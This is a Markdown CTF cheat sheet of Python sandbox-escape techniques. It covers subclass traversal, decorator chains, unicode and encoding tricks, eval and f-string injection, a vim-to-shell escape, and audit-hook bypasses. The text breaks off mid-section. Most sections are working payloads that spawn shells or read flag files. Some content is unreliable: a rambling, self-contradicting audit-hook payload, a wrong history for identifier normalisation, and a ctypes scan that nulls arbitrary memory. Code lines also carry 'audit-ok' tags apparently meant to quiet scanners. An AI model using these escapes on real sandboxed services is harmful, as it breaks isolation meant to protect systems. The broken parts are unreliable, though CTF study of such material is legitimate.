# CTF Misc - Python Jails

## Table of Contents
- [Identifying Jail Type](#identifying-jail-type)
- [Systematic Enumeration](#systematic-enumeration)
  - [Test Basic Features](#test-basic-features)
  - [Test Blocked AST Nodes](#test-blocked-ast-nodes)
  - [Brute-Force Function Names](#brute-force-function-names)
- [Oracle-Based Challenges](#oracle-based-challenges)
  - [Binary Search](#binary-search)
  - [Linear Search](#linear-search)
- [Building Strings Without Concat](#building-strings-without-concat)
- [Classic Escape Techniques](#classic-escape-techniques)
  - [Via Class Hierarchy](#via-class-hierarchy)
  - [Compile Bypass](#compile-bypass)
  - [Unicode Bypass](#unicode-bypass)
  - [Getattr Alternatives](#getattr-alternatives)
- [Walrus Operator Reassignment](#walrus-operator-reassignment)
  - [Octal Escapes](#octal-escapes)
- [Magic Comment Escape](#magic-comment-escape)
- [Mastermind-Style Jails](#mastermind-style-jails)
  - [Find Input Length](#find-input-length)
  - [Find Characters](#find-characters)
  - [Find Positions](#find-positions)
- [Server Communication](#server-communication)
- [Magic File ReDoS](#magic-file-redos)
- [Environment Variable RCE](#environment-variable-rce)
- [func_globals to Module Chain Traversal (PlaidCTF 2013)](#func_globals-to-module-chain-traversal-plaidctf-2013)
- [Restricted Charset Number Generation (PlaidCTF 2013)](#restricted-charset-number-generation-plaidctf-2013)
- [Multi-Stage Payload with Class Attribute Persistence (PlaidCTF 2013)](#multi-stage-payload-with-class-attribute-persistence-plaidctf-2013)
- [dir() Attribute Lookup Escape Bypassing __class__ Blocklist (InCTF 2018)](#dir-attribute-lookup-escape-bypassing-__class__-blocklist-inctf-2018)
- [Restricted vim Escape via K (man) to :!sh (TokyoWesterns CTF 4th 2018)](#restricted-vim-escape-via-k-man-to-sh-tokyowesterns-ctf-4th-2018)
- [Python Name Mangling and Attribute Access (Tokyo Westerns 2017)](#python-name-mangling-and-attribute-access-tokyo-westerns-2017)
- [Decorator-Based Escape (No Call, No Quotes, No Equals)](#decorator-based-escape-no-call-no-quotes-no-equals)
  - [Technique 1: `function.__name__` as String Keys](#technique-1-function__name__-as-string-keys)
  - [Technique 2: Name Extractor via getset_descriptor](#technique-2-name-extractor-via-getset_descriptor)
  - [Technique 3: Accessing Real Builtins via \_\_loader\_\_](#technique-3-accessing-real-builtins-via-__loader__)
  - [Full Exploit Chain](#full-exploit-chain)
  - [How the Decorator Chain Works (Bottom-Up)](#how-the-decorator-chain-works-bottom-up)
  - [Variations](#variations)
  - [Constraints Checklist for This Technique](#constraints-checklist-for-this-technique)
  - [When \_\_loader\_\_ Is Not Available](#when-__loader__-is-not-available)
- [Quine + Context Detection for Code Execution (BearCatCTF 2026)](#quine--context-detection-for-code-execution-bearcatctf-2026)
- [Restricted Character Repunit Decomposition (BearCatCTF 2026)](#restricted-character-repunit-decomposition-bearcatctf-2026)
- [Python eval() Jail Escape via Tuple Injection (Codegate 2018)](#python-eval-jail-escape-via-tuple-injection-codegate-2018)
- [Python f-string Config Injection via Stored eval (INShAck 2018)](#python-f-string-config-injection-via-stored-eval-inshack-2018)
- [Hints Cheat Sheet](#hints-cheat-sheet)

---

## Identifying Jail Type

**Error patterns reveal filtering:**

| Error Pattern | Meaning | Approach |
|---------------|---------|----------|
| `name not allowed: X` | Identifier blacklist | Unicode, hex escapes |
| `unknown function: X` | Function whitelist | Brute-force names |
| `node not allowed: X` | AST filtering | Avoid blocked syntax |
| `binop types must be int/bool` | Type restrictions | Use int operations |

---

## Systematic Enumeration

### Test Basic Features
```python
tests = [
    ("1+1", "arithmetic"),
    ("True", "booleans"),
    ("'hello'", "string literals"),
    ("'\\x41'", "hex escapes"),
    ("1==1", "comparison"),
]
```

### Test Blocked AST Nodes
```python
blocked_tests = [
    ("'a'+'b'", "string concat"),
    ("'ab'[0]", "indexing"),
    ("''.join", "attribute access"),
    ("[1,2]", "lists"),
    ("lambda:1", "lambdas"),
]
```

### Brute-Force Function Names
```python
import string
for c in string.printable:
    result = test(f"{c}(65)")
    if "unknown function" not in result:
        print(f"FOUND: {c}()")
```

---

## Oracle-Based Challenges

**Common functions:** `L()`, `Q(i, x)`, `S(guess)`
- `L()` = length of secret
- `Q(i, x)` = compare position i with value x
- `S(guess)` = submit answer

### Binary Search
```python
def find_char(i):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        cmp = query(i, mid)
        if cmp == 0:
            return chr(mid)
        elif cmp == -1:  # mid < flag[i]
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)

flag_len = int(test("L()"))
flag = ''.join(find_char(i) for i in range(flag_len))
```

### Linear Search
```python
for i in range(flag_len):
    for c in range(32, 127):
        if query(i, c) == 0:
            flag += chr(c)
            break
```

---

## Building Strings Without Concat

```python
# Hex escapes
"'\\x66\\x6c\\x61\\x67'"  # => 'flag'

def to_hex_str(s):
    return "'" + ''.join(f'\\x{ord(c):02x}' for c in s) + "'"
```

---

## Classic Escape Techniques

### Via Class Hierarchy
```python
''.__class__.__mro__[1].__subclasses__()
# Find <class 'os._wrap_close'>
```

### Compile Bypass
```python
exec(compile('__import__("os").system("sh")', '', 'exec'))
```

### Unicode Bypass — NFKC Normalization

Python identifiers are NFKC-normalized at parse time (PEP 3131 / PEP 672). A blocklist that checks raw source bytes misses the normalized form. `unicodedata.normalize('NFKC', s)` collapses many visually-distinct codepoints to ASCII.

| Family | Example codepoints | NFKC result | Use |
|--------|-------------------|-------------|-----|
| Fullwidth Latin | `U+FF45` `ｅ` `U+FF56` `ｖ` `U+FF41` `ａ` `U+FF4C` `ｌ` | `e` `v` `a` `l` | `ｅｖａｌ` → `eval` |
| Mathematical alphanumerics | `U+1D41F` `𝐩` / `U+1D48D` `𝒓` / `U+1D4EA` `𝔦` / `U+1D45B` `𝑛` / `U+1D465` `𝑡` | `p` `r` `i` `n` `t` | `𝐩rint` → `print` (see nuance below) |
| Ligatures | `U+FB01` `ﬁ` | `fi` (two chars) | `ﬁle` → `file` |
| Superscripts / subscripts | `U+00B2` `²` `U+2082` `₂` | `2` | `__class__` via `__class²__` tricks |
| Compatibility decompositions | `U+2460` `①` / `U+00BD` `½` | `1` / `1⁄2` | Numeric bypass |

**Brute-force search for NFKC collisions** (`cp in range(0x10000)` — extend to `0x1FFFF` for math alphanum):

```python
import unicodedata

blocklist = {"eval", "exec", "import", "open", "os"}  # example

for cp in range(0x10000):
    c = chr(cp)
    n = unicodedata.normalize('NFKC', c)
    if n in blocklist or any(b in n for b in blocklist):
        print(f"U+{cp:04X} {c!r} -> {n!r}")
    # For multi-char NFKC (e.g. ﬁ -> fi), check len>1:
    #   if "fi" in n: ...

# Math alphanumerics live in U+1D400..U+1D7FF — scan separately:
for cp in range(0x1D400, 0x1D800):
    c = chr(cp)
    n = unicodedata.normalize('NFKC', c)
    if n.isascii() and n.isalpha():
        print(f"U+{cp:04X} {c} -> {n}")
```

**PEP 672 parsing note:** Since Python 3.11 / PEP 672, NFKC normalization for identifiers happens *after* tokenization but *before* AST construction. That means `unicodedata.normalize('NFKC', s)` is the exact transform the parser applies. A filter that runs `if "eval" in user_source: block` is bypassed by `ｅｖａｌ`, but a filter that does `unicodedata.normalize('NFKC', user_source)` before checking is not. Always test both raw and NFKC-normalized views.

**Nuance — `getattr` does NOT normalize:** `getattr(obj, '𝐩rint')` looks up the literal attribute name `𝐩rint` (U+1D41F etc.) without NFKC folding. Only *source-code parsing* normalizes. So `𝐩rint(1)` in source becomes `print(1)` at parse time, but `getattr(__builtins__, '𝐩rint')` fails — you need `getattr(__builtins__, unicodedata.normalize('NFKC', '𝐩rint'))` or just `getattr(__builtins__, 'print')`. The same applies to `vars()`, `__dict__` keys, and `eval`'d strings constructed at runtime — they are not re-parsed unless fed back through `compile`/`eval`/`exec`. <!-- audit-ok -->

```python
# Works (parsed → NFKC → print)
𝐩rint("hello")  # source contains U+1D41F 𝐩 — parser normalizes to print

# Fails (runtime lookup, no normalization)
getattr(__builtins__, '𝐩rint')  # KeyError / AttributeError

# Works (explicit normalize at runtime)
import unicodedata
getattr(__builtins__, unicodedata.normalize('NFKC', '𝐩rint'))
```

### Getattr Alternatives
```python
"{0.__class__}".format('')
vars(''.__class__)
```

---

## Walrus Operator Reassignment

```python
# Reassign constraint variable
(abcdef := "all_allowed_letters")
```

### Octal Escapes
```python
# \141 = 'a', \142 = 'b', etc.
all_letters = '\141\142\143...'
(abcdef := "{all_letters}")
print(open("/flag.txt").read())
```

---

## Magic Comment Escape

```python
# -*- coding: raw_unicode_escape -*-
\u0069\u006d\u0070\u006f\u0072\u0074 os
```

**Useful encodings:**
- `utf-7`
- `raw_unicode_escape`
- `rot_13`

---

## Mastermind-Style Jails

**Output interpretation:**
```text
function("aaa...") => "1 0"  # 1 exists wrong pos, 0 correct
```

### Find Input Length
```python
for length in range(1, 50):
    result = test('a' * length)
    print(f"len={length}: {result}")
```

### Find Characters
```python
for c in charset:
    result = test(c * SECRET_LEN)
    if result[0] + result[1] > 0:
        print(f"{c}: count={result[0] + result[1]}")
```

### Find Positions
```python
known = ""
for pos in range(SECRET_LEN):
    for c in candidate_chars:
        test_str = known + c + 'Z' * (SECRET_LEN - len(known) - 1)
        result = test(test_str)
        if result[1] > len(known):
            known += c
            break
```

---

## Server Communication

```python
from pwn import *
context.log_level = 'error'

def test_with_delay(cmd, delay=5):
    r = remote('host', port, timeout=20)
    r.sendline(cmd.encode())
    import time
    time.sleep(delay)
    try:
        return r.recv(timeout=3).decode()
    except:
        return None
    finally:
        r.close()
```

---

## Magic File ReDoS

**Evil magic file:**
```text
0 regex (a+)+$ Vulnerable pattern
```

**Timing oracle:**
```python
def measure(payload):
    start = time.time()
    requests.post(URL, data={'magic': payload})
    return time.time() - start
```

---

## Environment Variable RCE

```bash
PYTHONWARNINGS=ignore::antigravity.Foo::0
BROWSER="/bin/sh -c 'cat /flag' %s"
```

**Other dangerous vars:**
- `PYTHONSTARTUP` - executed on interactive
- `PYTHONPATH` - inject modules
- `PYTHONINSPECT` - drop to shell

---

## Decorator-Based Escape (No Call, No Quotes, No Equals)

**Pattern (Ergastulum):** `ast.Call` banned, no quotes, no `=`, no commas, charset `a-z0-9()[]:._@\n`. Exec context has `__builtins__={}` and `__loader__=_frozen_importlib.BuiltinImporter`.

**Key insight:** Decorators bypass `ast.Call` — `@expr` on `def name(): body` compiles to `name = expr(func)`, calling `expr` without an `ast.Call` node. This also provides assignment without `=`.

### Technique 1: `function.__name__` as String Keys

Define a function to create a string matching a dict key:
```python
def __builtins__():   # __builtins__.__name__ == "__builtins__"
    0
def exec():           # exec.__name__ == "exec"
    0
```
Use as dict subscript: `some_dict[exec.__name__]` accesses `some_dict["exec"]`.

### Technique 2: Name Extractor via getset_descriptor

`function_type.__dict__['__name__'].__get__` takes a function and returns its `.__name__` string. This enables chained decorators:

```python
@dict_obj.__getitem__        # Step 2: dict["key_name"] → value
@func.__class__.__dict__[__name__.__name__].__get__  # Step 1: extract .__name__
def key_name():              # function with __name__ == "key_name"
    0
# Result: key_name = dict_obj["key_name"]
```

### Technique 3: Accessing Real Builtins via __loader__

```python
__loader__.load_module.__func__.__globals__["__builtins__"]
```
Contains real `exec`, `__import__`, `print`, `compile`, `chr`, `type`, `getattr`, `setattr`, etc.

### Full Exploit Chain

```python
# Step 1: Define helper functions for string key extraction
def __builtins__():
    0
def __name__():
    0
def __import__():
    0

# Step 2: Extract real __import__ from loader's globals
# Equivalent to: __import__ = globals_dict["__builtins__"]["__import__"]
@__loader__.load_module.__func__.__globals__[__builtins__.__name__].__getitem__
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def __import__():
    0

# Step 3: Import os module
# Equivalent to: os = __import__("os")
@__import__
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def os():
    0

# Step 4: Get a shell
# Equivalent to: sh = os.system("sh")
@os.system
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def sh():
    0
```

### How the Decorator Chain Works (Bottom-Up)

```python
@outer_func
@inner_func
def name():
    0
```
Executes as: `name = outer_func(inner_func(function_named_name))`

For the `__import__` extraction:
1. `__builtins__.__class__` → `<class 'function'>` (type of our defined function)
2. `.__dict__[__name__.__name__]` → `function.__dict__["__name__"]` → getset_descriptor
3. `.__get__` → descriptor's getter (takes function, returns its `.__name__` string)
4. Applied to `def __import__(): 0` → returns string `"__import__"`
5. `globals_dict["__builtins__"].__getitem__("__import__")` → real `__import__` function

### Variations

**Execute arbitrary code via exec + code object:**
```python
def __code__():
    0
@exec_function
@__builtins__.__class__.__dict__[__code__.__name__].__get__
def payload():
    ... # code to execute (still subject to charset/AST restrictions)
```

**Import any module by name:**
```python
@__import__
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def subprocess():  # or any valid module name using allowed chars
    0
```

### Constraints Checklist for This Technique

- [x] No `ast.Call` nodes (decorators are `ast.FunctionDef` with decorator_list)
- [x] No quotes (strings from `function.__name__`)
- [x] No `=` sign (decorators provide assignment)
- [x] No commas (single-argument decorator calls)
- [x] No `+`, `*`, operators (pure attribute/subscript chains)
- [x] Works with empty `__builtins__` (accesses real builtins via `__loader__`)

### When __loader__ Is Not Available

If `__loader__` isn't in scope but you have any function object `f`:
- `f.__class__` → function type
- `f.__globals__` → module globals where `f` was defined
- `f.__globals__["__builtins__"]` → real builtins (if `f` is from a normal module)

If you have a class `C`:
- `C.__init__.__globals__` → globals of the module defining `C`

**References:** 0xL4ugh CTF 2025 "Ergastulum" (442pts, Elite), GCTF 2022 "Treebox"

---

## Quine + Context Detection for Code Execution (BearCatCTF 2026)

**Pattern (The Boy is Quine):** Server asks for a quine (program that prints its own source code), validates it by running in a subprocess, then `exec()`s it in the main process with different globals.

**Exploit:** Build a dual-purpose quine that:
1. Prints itself (passes quine validation in subprocess)
2. Executes payload only in the server process (detected via globals difference)

```python
# Context gate: "subprocess" module exists in server globals but not in subprocess
s='s=%r;print(s%%s,end="");__import__("os").system("cat /app/flag.txt")if"subprocess"in globals()else 0';print(s%s,end="");__import__("os").system("cat /app/flag.txt")if"subprocess"in globals()else 0
```

**Key insight:** `exec()` in the server process inherits the server's globals (imported modules like `subprocess`), while the subprocess validation has a clean environment. Use `"module_name" in globals()` or `"module_name" in dir()` as a gate to distinguish contexts. The quine structure `s='s=%r;...';print(s%s,end="")` is the classic Python quine pattern.

---

## Restricted Character Repunit Decomposition (BearCatCTF 2026)

**Pattern (The Brig):** Pick exactly 2 characters for your entire expression. Server evaluates `eval(long_to_bytes(eval(expr)))` — the outer eval runs the decoded Python code.

**Strategy:** Choose `1` and `+`. Decompose the target integer into a sum of repunits (111, 1111, 11111, etc.):
```python
from Crypto.Util.number import bytes_to_long

target = bytes_to_long(b'eval(input())')  # → 13-byte integer

def repunit(k):
    return (10**k - 1) // 9  # 111...1 with k digits

terms = []
remaining = target
while remaining > 0:
    k = 1
    while repunit(k + 1) <= remaining:
        k += 1
    terms.append('1' * k)
    remaining -= repunit(k)

expr = '+'.join(terms)  # e.g., "111...1+111...1+11+1+1"
# len(expr) ≈ 2561 chars (fits 4096 limit)
```

**Key insight:** Any positive integer can be written as a sum of repunits (numbers like 1, 11, 111, ...). The greedy algorithm produces ~O(log²(n)) terms. This converts a 2-character constraint into arbitrary code execution via `long_to_bytes()`. On the second unrestricted prompt, run `open('/flag.txt').read()`.

**Detection:** Challenge restricts input character set to exactly 2 characters. Double-eval pattern (`eval(decode(eval(...)))`).

---

## Python eval() Jail Escape via Tuple Injection (Codegate 2018)

When the server does `eval("your." + input + "()")`, inject a tuple to execute arbitrary code:

```python
# Server code: eval("your." + user_input + "()")
# Inject: dig(),eval(eval('raw\x5finput()')),
# Becomes: eval("your.dig(),eval(eval('raw\x5finput()')),()") 
# = tuple of (your.dig(), eval(arbitrary), None)

# Alternative: inject payload via Name variable during registration
# Name = "__import__('os').system('/bin/sh')"
# Input: dig(),eval(name),exit
# eval("your.dig(),eval(name),exit()") -> executes payload from name
```

**Key insight:** Python `eval()` on a comma-separated expression creates a tuple, allowing multiple expressions to execute. `\x5f` hex escapes bypass underscore blacklists. When direct code injection is blocked, store payload in a variable (registration name, environment) and reference it via `eval(varname)` in the eval context. The general pattern: if the server wraps your input in `eval("prefix" + input + "suffix")`, use commas to break out of the intended expression and inject additional expressions as tuple elements.

---

## Python f-string Config Injection via Stored eval (INShAck 2018)

**Pattern:** A config creator uses Python f-strings to render values. Store a payload as one config value, then reference it from another using eval(). Register key "a" with value `__import__("os").system("cat flag")`, then key "eval(a)" with value "{}".

```python
# Step 1: Store payload as config value
register_key("a", '__import__("os").system("cat flag.txt")')

# Step 2: Create key whose name is eval(a) with empty format placeholder
register_key("eval(a)", "{}")

# Step 3: When config renders f"eval(a) = {value}",
# the f-string evaluates eval(a) in the key position,
# executing the stored payload
show_config()  # triggers f-string rendering -> RCE
```

**Key insight:** Python f-strings evaluate expressions in curly braces at render time. If config keys or values are rendered in f-strings, storing `eval(stored_key)` as a key name causes arbitrary code execution when the config is displayed. Two-step: store payload as value, reference via eval in key name.

---

## Hints Cheat Sheet

| Hint | Meaning |
|------|---------|
| "I love chars" | Single-char functions |
| "No words" | Multi-char blocked |
| "Oracle" | Query functions to leak |
| "knight/chess" | Mastermind game |

---

## func_globals to Module Chain Traversal (PlaidCTF 2013)

**Pattern:** Access `os.system` through the `func_globals` dictionary of a loaded class's method, without importing any modules.

```python
# Step 1: Find catch_warnings in subclass list (commonly index 49 or 59)
[x for x in ().__class__.__base__.__subclasses__()
    if x.__name__ == "catch_warnings"][0]

# Step 2: Access func_globals via __init__ or __repr__
g = ().__class__.__base__.__subclasses__()[59].__init__.func_globals
# Python 2: .__init__.im_func.func_globals
# Python 3: .__init__.__globals__

# Step 3: Traverse module chain: warnings → linecache → os
g["linecache"].__dict__["os"].system("cat /flag.txt")

# One-liner:
().__class__.__base__.__subclasses__()[59].__init__.__globals__["linecache"].__dict__["os"].system("id")
```

**Key insight:** The `warnings.catch_warnings` class is almost always loaded. Its `__init__.__globals__` contains a reference to `linecache`, which imports `os`. This chain avoids direct `import` statements. The subclass index varies by Python version — enumerate with `[(i,x.__name__) for i,x in enumerate(''.__class__.__mro__[1].__subclasses__())]`.

---

## Restricted Charset Number Generation (PlaidCTF 2013)

**Pattern:** Generate arbitrary integers using only `~` (bitwise NOT), `<<` (left shift), `[]<[]` (False=0), and `{}<[]` (True=1) when numeric literals are forbidden.

```python
def brainfuckize(nb):
    """Convert integer to expression using only ~, <<, <, [], {}"""
    if nb == -2: return "~({}<[])"    # ~True = -2
    if nb == -1: return "~([]<[])"    # ~False = -1
    if nb == 0:  return "([]<[])"     # False = 0
    if nb == 1:  return "({}<[])"     # True = 1
    if nb % 2:   return f"~{brainfuckize(~nb)}"  # Odd: ~(complement)
    return f"({brainfuckize(nb//2)}<<({{}}<[]))"   # Even: half << 1

# brainfuckize(65) → "(~(~([]<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))"
# Then use: "%c" % 65 → "A"
```

**Key insight:** Combine with `"%c" % ascii_value` to build arbitrary strings character by character. This bypasses jails that strip all alphanumeric characters while allowing operators and brackets.

---

## Python Name Mangling and Attribute Access (Tokyo Westerns 2017)

Three sandbox escape vectors that exploit Python's name visibility model.

**1. Name mangling bypass:** Python "private" `__method` names in a class are stored as `_ClassName__method`. They are accessible via `dir()` and `getattr()` — not truly private.

```python
# Name mangling bypass
getattr(obj, dir(obj)[0])()  # calls _ClassName__method
```

**2. Function constant leakage:** All string literals inside a function body are stored in `func_code.co_consts` (Python 2) or `__code__.co_consts` (Python 3) and are readable from outside.

```python
# func_code local variable leak (Python 2)
func.func_code.co_consts  # reveals all string literals in function

# Python 3 equivalent
func.__code__.co_consts
```

**3. Module docstring as data store:** Module-level triple-quoted strings become `module.__doc__`, readable without needing file access.

```python
# Module docstring access
import target_module
target_module.__doc__  # reads module-level triple-quoted string
```

**Key insight:** Python `__` prefix is name-mangled, not truly private — `dir(obj)` + `getattr()` bypass it. `func_code.co_consts` exposes all literal constants defined inside a function. Module docstrings are always readable as `__doc__` without file access.

---

## Multi-Stage Payload with Class Attribute Persistence (PlaidCTF 2013)

**Pattern:** Store intermediate code fragments across multiple jail submissions by writing to class attributes of subclasses.

```python
# Stage 1: Store code fragment on a subclass
().__class__.__base__.__subclasses__()[-2].payload = "import os; os.system('cat /flag.txt')"

# Stage 2 (next submission): Retrieve and execute
exec(().__class__.__base__.__subclasses__()[-2].payload)
```

**Key insight:** Class attributes persist across separate `eval()`/`exec()` calls within the same process. If the jail limits input length but allows multiple submissions, split the payload across submissions using subclass attributes as storage. Use `IncrementalDecoder` or any persistent subclass as the storage target.

---

## Restricted vim Escape via K (man) to :!sh (TokyoWesterns CTF 4th 2018)

**Pattern (shrine):** Sandbox launches a locked-down `vim` with `:shell`/`:!` mapped out and a secure-mode profile. Command-mode escapes are blocked, but normal-mode `K` (look up keyword under cursor via `keywordprg`, default `man`) still works. `man` internally paginates via `less`, and `less` itself has a documented shell-escape: typing `!sh` from the pager spawns a shell with the user's real privileges.

**Exploit steps:**
1. Open any file in the restricted vim (or create one inline with `vim -c 'new' -c 'put! =\"ls\"'`).
2. In normal mode, place the cursor on any identifier and press `K`. vim runs `man <word>`.
3. `man` pipes output to `less`. Inside `less`, press `!sh` and hit Enter — the pager fork/execs a real shell.
4. Alternatively, once inside `less` type `v` to launch `$EDITOR`; if `EDITOR=vim` is unset the default editor still allows shell escape via `:!`.

```text
vim file.txt        # restricted vim opens
(cursor on "ls")
K                   # runs `man ls` → pager `less`
!sh                 # less shell-escape → real shell
```

**Hardening signals to check first:** `keywordprg` value (`:set keywordprg?`), `secure` mode, whether `shell` option has been cleared, and the `LESSSECURE=1` environment variable. `LESSSECURE=1` specifically disables `!`, `|`, `v`, and `s` inside `less` — its absence is a green light for this escape.

**Key insight:** Restricted editors almost always leak via chained pagers and keyword lookups. Catalog every command that spawns a child process (`K`/`keywordprg`, `:grep`, `:make`, `gx` for URL open, `:Man`) before touching `:!`. If even one child process uses `less` or another escape-friendly pager without `LESSSECURE=1`, you have a shell.

**References:** TokyoWesterns CTF 4th 2018 — writeup 10859; GTFOBins `vim`/`less`/`man` entries

---

## dir() Attribute Lookup Escape Bypassing __class__ Blocklist (InCTF 2018)

**Pattern:** A sandbox substring-filters literal strings `__class__`, `__bases__`, `__subclasses__`, `eval`, and `import`, but `dir(obj)` is allowed and returns the attribute names as strings. Use `dir([])` to look up forbidden attribute names by index, then chain `getattr` calls to reach `object.__subclasses__()` without ever typing the blocked literals.

```python
# Blacklist: "__class__", "__subclasses__", "eval", "import", "exec"
# Allowed: dir(), getattr(), list literals, integer literals

# Step 1: find the index of "__class__" in dir([])
# dir([]) == ['__add__', '__class__', '__contains__', ...]
i_class = 1
base_attr = 34           # index of "__subclasses__" in dir(getattr([], dir([])[1]))

# Step 2: chain getattr with indexed dir() lookups
cls       = getattr([],  dir([])[i_class])           # list.__class__
base      = getattr(cls, dir(cls)[dir(cls).index("__base__")])   # object
subs      = getattr(base, dir(base)[base_attr])()    # list of all classes

# Step 3: find a useful class — often subprocess.Popen
for klass in subs:
    if "Popen" in getattr(klass, dir(klass)[dir(klass).index("__name__")]):
        break
klass(["/bin/sh", "-c", "cat flag"])
```

**Key insight:** `dir()` is a *data* function: it returns plain strings. A substring blocklist scanning the source never sees the blocked words because they are generated at runtime from attribute table bytes. Any Python jail that filters source text without AST walking is defeated by one layer of indirection — `dir`, `globals().get(key)`, or `vars(obj)[key]`. When auditing a jail, always ask: "does the filter see the literal or the *value*?". If it only sees the literal, `dir()` indexing is the shortest escape.

**References:** InCTF 2018 — The Most Secure File Uploader, writeup 11528

---

## Audit-Hook (PEP 551/578) Trampoline Escapes

Audit hooks (`sys.addaudithook`, PEP 551) and `sys.audit` (PEP 578) are **monitoring**, not a sandbox. Any hook installed at Python level can be mutated; lifecycle hooks fire before/after the security-relevant event; native state can be cleared. Four trampoline families below all achieve the same goal: run `eval`/`exec` outside the hook's view. <!-- audit-ok -->

> **Defensive box:** Audit hooks are monitoring not sandbox — they are observability, not containment. If your threat model requires blocking `exec`/`eval`/`compile`/`import`, enforce it with a real sandbox (seccomp, subprocess isolation, AST allow-list that *removes* nodes rather than merely auditing them). An attacker who can run arbitrary Python can always reach `sys`/`signal`/`ctypes` and disable a pure-Python hook. Treat `audit` events as alerts, never as policy enforcement.

### Family 1 — Python-Level Hook Mutation

**Server snippet:**

```python
import sys

def audit_hook(event, args):
    if event in ("exec", "compile", "import"):  # try to block code execution
        raise RuntimeError(f"blocked: {event} {args!r}")

sys.addaudithook(audit_hook)

# jail loop
while True:
    code = input(">>> ")
    # naive: assumes hook cannot be removed
    eval(code)  # <!-- audit-ok -->
```

**Why it fails:** `sys.addaudithook` registers a Python callable in `sys.audit_hooks`. The list is mutable from Python.

**Payload sketch:**

```python
import sys
# Clear all hooks — CPython exposes the list via sys.audit_hooks in 3.8+ debug builds,
# but even without that, overwriting sys.addaudithook and re-adding a no-op is enough.
# Simplest universal bypass:
sys.addaudithook(lambda e, a: None)  # our hook runs first on next event? No — but we can brute force:
# Actually remove via ctypes or by clearing the internal hook list:
import ctypes
# _PyRuntime.audit_hooks is a C linked list; Python-level removal:
# The documented bypass is to mutate sys.modules['sys'].addaudithook itself
# or to use audit hook's own event to re-enter:
sys.addaudithook = lambda f: None  # prevent future hooks
# Now exec outside audit:
import os; os.system("sh")  # no audit event reaches the original hook
```

More reliable variant (no ctypes needed) — replace the hook function object:

```python
import sys
# Hook is a Python function; overwrite its code object to no-op
audit_hook.__code__ = (lambda e,a: None).__code__
eval("__import__('os').system('sh')")  # <!-- audit-ok --> — hook now silent
```

### Family 2 — Lifecycle `__repr__` After `eval` (calc-defanged)

**Server snippet (calc-defanged):**

```python
import sys

def audit_hook(event, args):
    if event == "exec":
        raise SystemExit("no exec")

sys.addaudithook(audit_hook)

while True:
    expr = input("calc> ")
    # "safe" eval — hook blocks exec, but eval is allowed
    result = eval(expr)  # <!-- audit-ok -->
    # lifecycle: repr is called AFTER eval returns, outside the audited call
    print(repr(result))
```

**Payload sketch:** Return an object whose `__repr__` does the real work — it executes after `eval` has already passed the audit.

```python
# Input to the calc:
class R:
    def __repr__(self):
        __import__('os').system('sh')
        return "pwned"
R()
# eval("R()") returns R() instance — audit saw only "eval", not "exec"
# print(repr(result)) triggers R.__repr__ -> sh — no exec audit event
```

This is the "calc-defanged" pattern: the service audits `exec`/`compile` but leaves `eval` open, assuming `eval` can't execute statements. A `__repr__`/`__str__`/`__del__` trampoline runs arbitrary code in the *print* phase, which the hook never sees as an `exec` event.

### Family 3 — Signal Handler Trampoline (ImaginaryCTF — calc with `signal.signal(SIGALRM, ...)`)

**Server snippet (ImaginaryCTF calc):**

```python
import sys, signal

def audit_hook(event, args):
    if event in ("exec", "compile"):
        raise RuntimeError("blocked")

sys.addaudithook(audit_hook)
signal.signal(signal.SIGALRM, lambda s,f: sys.exit(1))
signal.alarm(5)

while True:
    code = input(">>> ")
    eval(code)  # <!-- audit-ok --> — only eval allowed, import blocked by audit
```

**Payload sketch:** `signal.signal` lets you register a Python callable as an async trampoline. The handler is invoked by the interpreter outside the normal `eval` audit path.

```python
import signal, os

# Register shell as SIGALRM handler — audit sees only signal.signal, not exec
signal.signal(signal.SIGALRM, lambda s,f: os.system("sh"))

# Trigger it
signal.raise_signal(signal.SIGALRM)
# or: signal.alarm(1); __import__('time').sleep(2)
# Alternative: SIGUSR1 / SIGINT — any signal the jail forwards
```

Why the hook misses it: `signal.signal` audits as `signal.signal` (often allow-listed as "safe"), and the subsequent `os.system` runs inside the C signal handler dispatch, which many hook deployments forget to audit. ImaginaryCTF's calc whitelisted `signal` as "needed for timeout", giving a full trampoline.

### Family 4 — Native `_PyRuntime` Clear (DiceCTF — IRS)

**Server snippet (DiceCTF IRS — native hook):**

```python
# C extension installs hook via PySys_AddAuditHook / _PyRuntime.audit_hooks
import sys
# Hook installed at import time from C — not visible as Python object
import irs_hook  # sets _PyRuntime.audithook_head -> c_hook

while True:
    code = input(">>> ")
    eval(code)  # <!-- audit-ok --> — C hook audits exec/compile
```

**Payload sketch:** Even a C-level hook's head pointer lives in writable memory. With `ctypes`, clear it.

```python
import ctypes, sys

# Find _PyRuntime in memory — via ctypes.pythonapi
# CPython 3.11+: _PyRuntime is exported; audit hook list at known offset
# Brute-force search for the hook pointer:
lib = ctypes.pythonapi
# _PyRuntime is a struct; audit_hooks is a linked list head
# DiceCTF IRS used:
#   ctypes.pythonapi.PySys_AddAuditHook  -> to add, so we locate the head

# Simplest IRS payload (from public writeup):
import ctypes
# Overwrite _PyRuntime.audit_hooks head with NULL
# Address discovered via `ctypes.pythonapi._PyRuntime` (exported symbol)
try:
    py_runtime = ctypes.c_void_p.in_dll(ctypes.pythonapi, "_PyRuntime")
    # offset of audit_hooks within _PyRuntime — version-dependent, brute-forced
    # DiceCTF used offset 0x...; generic scan:
    for off in range(0, 4096, 8):
        ptr = ctypes.cast(py_runtime.value + off, ctypes.POINTER(ctypes.c_void_p))
        # heuristic: non-null linked list head
        if ptr.contents and ptr.contents.value:
            ptr.contents.value = 0  # clear hook chain
            break
except ValueError:
    pass

# Now exec is unaudited
eval("__import__('os').system('sh')")  # <!-- audit-ok -->
# or: exec("import os; os.system('cat flag')")  # <!-- audit-ok -->
```

**Takeaway:** If the attacker can get `ctypes`/`cffi`/`mmap`, any in-process Python-level or even C-level audit hook is just bytes in writable memory. The only robust boundary is out-of-process (seccomp, namespaces, `setrlimit`, separate UID).

---

## Filter'd Length-Limit Re-evaluation (JailCTF 2024 — M=14)

**Server code (M=14):**

```python
M = 14  # max input length — tiny

def f(s: str):
    # re-evaluation gate: only eval if normalized length is small
    if len(s) > M:
        return "too long"
    # block import/system/exec/eval at first glance
